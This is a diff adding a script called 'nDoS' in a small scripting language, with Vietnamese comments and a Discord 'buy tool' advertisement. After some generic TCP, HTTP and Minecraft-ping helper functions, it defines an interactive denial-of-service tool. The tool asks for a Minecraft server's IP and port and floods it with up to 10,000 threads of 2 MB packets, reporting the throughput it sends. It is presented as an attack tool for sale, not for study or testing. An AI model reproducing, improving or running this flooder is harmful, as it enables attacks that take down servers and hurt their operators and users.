@@ -1,0 +1,334 @@
+# ============================================================================
+# nDoS — Manios
+# ============================================================================
+# Author:  IdlerHa
+# Version: 2.0.0
+#
+# Tich hop: nSocks TCP Library + nDoS Attack Tool
+# ============================================================================
+
+# ===================== CẤU HÌNH =====================
+hold PACKET_PER_CONN = 4
+hold DATA_PER_PACKET = 2097152
+
+# --- TCP Client — high-level wrapper ---
+
+# tc = tcp_client(host, port) — tao TCP client
+# Tra ve dict: {"fd": socket_fd, "host": host, "port": port}
+craft tcp_client host port
+    hold fd = nsocks_connect(host, port)
+    check fd == -1
+        yell "[nSocks] Khong the ket noi den " + host + ":" + str(port)
+        give none
+    end
+    hold client = vault {
+        "fd": fd,
+        "host": host,
+        "port": port
+    }
+    give client
+end
+
+# tcp_send(client, data) — gui du lieu qua TCP client
+craft tcp_send client data
+    hold sent = nsocks_send(client["fd"], data)
+    give sent
+end
+
+# tcp_recv(client, size) — nhan du lieu tu TCP client
+craft tcp_recv client size
+    hold data = nsocks_recv(client["fd"], size)
+    give data
+end
+
+# tcp_close(client) — dong TCP client
+craft tcp_close client
+    hold ok = nsocks_close(client["fd"])
+    give ok
+end
+
+# --- TCP Server — high-level wrapper ---
+
+# tcp_server(port) — tao TCP server lang nghe
+# Tra ve dict: {"fd": socket_fd, "ip": "0.0.0.0", "port": port}
+craft tcp_server port
+    hold fd = nsocks_bind("0.0.0.0", port)
+    check fd == -1
+        yell "[nSocks] Khong the bind port " + str(port)
+        give none
+    end
+    hold server = vault {
+        "fd": fd,
+        "ip": "0.0.0.0",
+        "port": port
+    }
+    yell "[nSocks] Server dang lang nghe 0.0.0.0:" + str(port)
+    give server
+end
+
+# tcp_accept(server) — chap nhan ket noi den server
+# Tra ve dict: {"fd": client_fd, "ip": ip, "port": port} hoac none
+craft tcp_accept server
+    hold info = nsocks_accept(server["fd"])
+    check info == none
+        give none
+    end
+    hold client = vault {
+        "fd": info[0],
+        "ip": info[1],
+        "port": info[2]
+    }
+    give client
+end
+
+# --- HTTP Client — gui HTTP request don gian ---
+
+# http_get(host, path) — gui HTTP GET request
+# Tra ve: response body string
+craft http_get host path
+    hold port = 80
+    hold sock = nsocks_connect(host, port)
+    check sock == -1
+        yell "[nSocks] HTTP GET that bai: khong the ket noi"
+        give ""
+    end
+
+    hold request = "GET " + path + " HTTP/1.0\r\nHost: " + host + "\r\n\r\n"
+    nsocks_send(sock, request)
+    hold response = nsocks_recv(sock, 65536)
+    nsocks_close(sock)
+
+    # Tach body ra khoi header
+    hold sep = find(response, "\r\n\r\n")
+    check sep != -1
+        set response = substr(response, sep + 4, len(response) - sep - 4)
+    end
+
+    give response
+end
+
+# http_post(host, path, body) — gui HTTP POST request
+# Tra ve: response body string
+craft http_post host path body
+    hold port = 80
+    hold sock = nsocks_connect(host, port)
+    check sock == -1
+        yell "[nSocks] HTTP POST that bai: khong the ket noi"
+        give ""
+    end
+
+    hold content_len = len(body)
+    hold request = "POST " + path + " HTTP/1.0\r\n"
+    set request = request + "Host: " + host + "\r\n"
+    set request = request + "Content-Type: application/x-www-form-urlencoded\r\n"
+    set request = request + "Content-Length: " + str(content_len) + "\r\n"
+    set request = request + "\r\n"
+    set request = request + body
+
+    nsocks_send(sock, request)
+    hold response = nsocks_recv(sock, 65536)
+    nsocks_close(sock)
+
+    hold sep = find(response, "\r\n\r\n")
+    check sep != -1
+        set response = substr(response, sep + 4, len(response) - sep - 4)
+    end
+
+    give response
+end
+
+# --- Minecraft Server Ping — kiem tra server Minecraft online ---
+
+# mc_ping(host, port) — ping server Minecraft
+# Tra ve: JSON response string tu server, hoac "" neu offline
+craft mc_ping host port
+    check port == 0
+        set port = 25565
+    end
+
+    # Build Minecraft handshake + status request packet
+    # Protocol: mac dinh 756 (1.19+), truyen protocol version neu can
+    hold packet = nsocks_mc_packet(host, port, 256, 756)
+    hold sock = nsocks_connect(host, port)
+    check sock == -1
+        give ""
+    end
+
+    nsocks_send(sock, packet)
+    hold response = nsocks_recv(sock, 65536)
+    nsocks_close(sock)
+
+    # Minecraft response: packet_length + packet_id + JSON_string_length + JSON_string
+    # Can doc byte de lay JSON
+    check len(response) > 5
+        # Skip packet length (varint) and packet ID (varint)
+        # JSON length is next varint, then the JSON string
+        # Don gian: tim ky tu '{' dau tien
+        hold start = find(response, "{")
+        check start != -1
+            set response = substr(response, start, len(response) - start)
+        end
+    end
+
+    check response == ""
+        give ""
+    end
+
+    give response
+end
+
+# --- Utility ---
+
+# resolve(host) — DNS lookup
+craft resolve host
+    give nsocks_resolve(host)
+end
+
+# nsocks_help() — hien thi tro giup
+craft nsocks_help
+    yell ""
+    yell "  ╔══════════════════════════════════════╗"
+    yell "  ║  nSocks v1.0.0 - TCP Networking       ║"
+    yell "  ║  Author: IdlerHa                      ║"
+    yell "  ╚══════════════════════════════════════╝"
+    yell ""
+    yell "  [TCP Client]"
+    yell "    tcp_client(host, port)         -> client dict"
+    yell "    tcp_send(client, data)         -> bytes sent"
+    yell "    tcp_recv(client, size)         -> data string"
+    yell "    tcp_close(client)              -> bool"
+    yell ""
+    yell "  [TCP Server]"
+    yell "    tcp_server(port)               -> server dict"
+    yell "    tcp_accept(server)             -> client dict or none"
+    yell ""
+    yell "  [HTTP Client]"
+    yell "    http_get(host, path)           -> response body"
+    yell "    http_post(host, path, body)    -> response body"
+    yell ""
+    yell "  [Minecraft]"
+    yell "    mc_ping(host, port)            -> JSON response"
+    yell "    nsocks_mc_packet(ip, port, sz) -> packet bytes"
+    yell ""
+    yell "  [Utility]"
+    yell "    resolve(host)                  -> IP string"
+    yell "    nsocks_version()               -> version string"
+    yell "    nsocks_help()                  -> tro giup nay"
+    yell ""
+end
+
+# ============================================================================
+# nDoS — Attack Functions
+# ============================================================================
+
+# ===== Logo =====
+craft logo
+    yell ""
+    yell "  ▄▄▄▄▄▄      ▄▄                  ▄▄     ▄▄▄   ▄   ▄▄▄▄       ▄▄▄▄▄"
+    yell "  Tool attack server easy."
+    yell "  Author: IdlerHa"
+    yell ""
+end
+
+# ===== Tấn công Minecraft (dùng tcp_flood built-in, pure Manios) =====
+craft attack_minecraft
+    hold data = input("Input IP:PORT Server: ")
+    hold colon_pos = find(data, ":")
+    check colon_pos == -1
+        yell "Invalid format! Use IP:PORT (e.g. 1.2.3.4:25565)"
+        yell ""
+        give none
+    end
+    hold ip = substr(data, 0, colon_pos)
+    hold port_str = substr(data, colon_pos + 1, len(data) - colon_pos - 1)
+    check port_str == ""
+        yell "Defaulting to port 25565"
+        hold port = 25565
+    end
+    check port_str != ""
+        hold port = int(port_str)
+    end
+    hold thread_input = input("Thread count (ex:500): ")
+    hold thread_count = 500
+    check thread_input != ""
+        set thread_count = int(thread_input)
+    end
+    check thread_count > 10000
+        set thread_count = 10000
+        yell "[!] Max thread count is 10000. Capped to 10000."
+    end
+    check thread_count < 1
+        set thread_count = 1
+    end
+    yell ""
+    yell "[+] Attacking " + ip + ":" + str(port) + " with " + str(thread_count) + " threads..."
+    yell "[+] Press Ctrl+C to stop"
+    yell ""
+    tcp_flood_reset_stats()
+    tcp_flood(ip, port, thread_count, DATA_PER_PACKET, PACKET_PER_CONN)
+    hold prev = 0
+    spin while true
+        sleep(1)
+        hold now = tcp_flood_stats()
+        hold delta = now - prev
+        set prev = now
+        hold mb = float(delta) / 1048576.0
+        hold mbps = (float(delta) * 8.0) / 1048576.0
+        yell "[+] Sent " + str(mb) + " MB (" + str(mbps) + " Mbps) to " + ip + ":" + str(port)
+    end
+end
+
+# ===== Giới thiệu =====
+craft show_intro
+    yell "=============================================================="
+    yell ""
+    yell "         [1] - Author: IdlerHa"
+    yell "         [2] - Discord: @banhmius"
+    yell "         [3] - Buy tool: https://discord.gg/un6bs3aCrF"
+    yell "         [4] - Contact: minhchienmmo@outlook.com"
+    yell ""
+    yell "=============================================================="
+    yell ""
+    hold _ = input("Press any key to return...")
+end
+
+# ===== Menu chính =====
+craft menu
+    hold running = true
+    spin while running
+        yell "============================================================"
+        yell "         [1] - Attack Minecraft Server (TCP)"
+        yell "         [2] - Attack Website Server (HTTP) [Coming Soon]"
+        yell "         [3] - Introduction"
+        yell "         [4] - Exit"
+        yell "============================================================"
+        yell ""
+        hold choice = input("Your choice: ")
+        check choice == "1"
+            attack_minecraft()
+        end
+        check choice == "2"
+            yell "=============================================================="
+            yell ""
+            yell "           This feature is not yet completed."
+            yell ""
+            yell "=============================================================="
+            yell ""
+            hold _ = input("Press any key to return...")
+        end
+        check choice == "3"
+            show_intro()
+        end
+        check choice == "4"
+            yell "Thank you for using my program!"
+            set running = false
+        end
+        check choice == ""
+            yell ""
+        end
+    end
+end
+
+logo()
+menu()
+exit(0)
